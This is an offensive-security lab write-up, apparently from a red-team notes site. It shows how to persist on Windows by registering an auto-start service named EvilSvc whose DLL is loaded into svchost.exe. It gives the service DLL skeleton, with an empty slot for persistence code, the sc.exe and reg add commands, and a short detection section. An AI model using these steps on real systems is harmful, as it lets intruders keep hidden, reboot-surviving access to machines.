# Persisting in svchost.exe with a Service DLL

This is a quick lab that looks into a persistence mechanism that relies on installing a new Windows service, that will be hosted by an svchost.exe process.

## Overview

At a high level, this is how the technique works:

1. Create a service `EvilSvc.dll` DLL \(the DLL that will be loaded into an `svchost.exe`\) with the code we want executed on each system reboot
2. Create a new service `EvilSvc` with `binPath= svchost.exe`
3. Add the `ServiceDll` value to `EvilSvc` service and point it to the service DLL compiled in step 1
4. Modify `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost` to specify under which group your service should be loaded into
5. Start `EvilSvc` service
6. The `EvilSvc` is started and its service DLL `EvilSvc.dll` is loaded into an `svchost.exe`

## Walkthrough

### 1. Compile Service DLL

First of, let's compile our service DLL as EvilSvc.dll. This DLL is going to be loaded into an `svchost.exe` as part of our service `EvilSvc` that we will register in a second:

```cpp
#include "pch.h"
#define SVCNAME TEXT("EvilSvc")

SERVICE_STATUS serviceStatus;
SERVICE_STATUS_HANDLE serviceStatusHandle;
HANDLE stopEvent = NULL;

VOID UpdateServiceStatus(DWORD currentState)
{
    serviceStatus.dwCurrentState = currentState;
    SetServiceStatus(serviceStatusHandle, &serviceStatus);
}

DWORD ServiceHandler(DWORD controlCode, DWORD eventType, LPVOID eventData, LPVOID context)
{
    switch (controlCode)
    {
        case SERVICE_CONTROL_STOP:
            serviceStatus.dwCurrentState = SERVICE_STOPPED;
            SetEvent(stopEvent);
            break;
        case SERVICE_CONTROL_SHUTDOWN:
            serviceStatus.dwCurrentState = SERVICE_STOPPED;
            SetEvent(stopEvent);
            break;
        case SERVICE_CONTROL_PAUSE:
            serviceStatus.dwCurrentState = SERVICE_PAUSED;
            break;
        case SERVICE_CONTROL_CONTINUE:
            serviceStatus.dwCurrentState = SERVICE_RUNNING;
            break;
        case SERVICE_CONTROL_INTERROGATE:
            break;
        default:
            break;
    }

    UpdateServiceStatus(SERVICE_RUNNING);

    return NO_ERROR;
}

VOID ExecuteServiceCode()
{
    stopEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
    UpdateServiceStatus(SERVICE_RUNNING);

    // #####################################
    // your persistence code here
    // #####################################

    while (1)
    {
        WaitForSingleObject(stopEvent, INFINITE);
        UpdateServiceStatus(SERVICE_STOPPED);
        return;
    }
}

extern "C" __declspec(dllexport) VOID WINAPI ServiceMain(DWORD argC, LPWSTR * argV)
{
    serviceStatusHandle = RegisterServiceCtrlHandler(SVCNAME, (LPHANDLER_FUNCTION)ServiceHandler);

    serviceStatus.dwServiceType = SERVICE_WIN32_SHARE_PROCESS;
    serviceStatus.dwServiceSpecificExitCode = 0;

    UpdateServiceStatus(SERVICE_START_PENDING);
    ExecuteServiceCode();
}
```

### 2. Create EvilSvc Service

Let's now create a new service called `EvilSvc` and specify the `binPath` to be `svchost.exe -k DcomLaunch`, which will tell Service Control Manager that we want our `EvilSvc` to be hosted by `svchost.exe` in a service group called `DcomLaunch`:

```text
sc.exe create EvilSvc binPath= "c:\windows\System32\svchost.exe -k DcomLaunch" type= share start= auto
```

### 3. Modify EvilSvc - Specify ServiceDLL Path

Next, inside `HKLM\SYSTEM\CurrentControlSet\services\EvilSvc\`, create a new value called `ServiceDll` and point it to the EvilSvc.dll service DLL compiled in step 1:

```text
reg add HKLM\SYSTEM\CurrentControlSet\services\EvilSvc\Parameters /v ServiceDll /t REG_EXPAND_SZ /d C:\Windows\system32\EvilSvc.dll /f
```

{% hint style="warning" %}
`EvilSvc.dll` must exist in `C:\Windows\system32\EvilSvc.dll`
{% endhint %}

At this point, our `EvilSvc` should be created with all the right parameters as seen in the registry:

![](../../.gitbook/assets/image%20%28710%29.png)

### 4. Group EvilSvc with DcomLaunch

As a final step, we need to tell the Service Control Manager under which service group our `EvilSvc`should load. 

We want it to get loaded in the `DcomLaunch` group, so we need to add our service name `EvilSvc` in the list of services in the `DcomLaunch` value in `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost`:

![](../../.gitbook/assets/image%20%28584%29.png)

### 5. Start EvilSvc Service

We can now try loading our `EvilSvc` service:

```text
sc.exe start EvilSvc
```

`EvilSvc` is now loaded into svchost.exe as part of a `DcomLauncher` services group:

![](../../.gitbook/assets/image%20%28643%29.png)

## Detection

Below are some initial thoughts on how one could start hunting for this technique:

* Recently created services with `svchost.exe` as a `binpath`
* Listing out ServiceDLL value for all system services and looking for DLLs that are loaded from suspicious locations \(i.e non c:\windows\system32\): `Get-ItemProperty hklm:\SYSTEM\ControlSet001\Services\*\Parameters | ? { $_.servicedll } | select psparentpath, servicedll`

![EvilSvc.dll location sticking out](../../.gitbook/assets/image%20%28678%29.png)

## References

{% embed url="https://docs.microsoft.com/en-us/windows/win32/services/writing-a-servicemain-function" %}

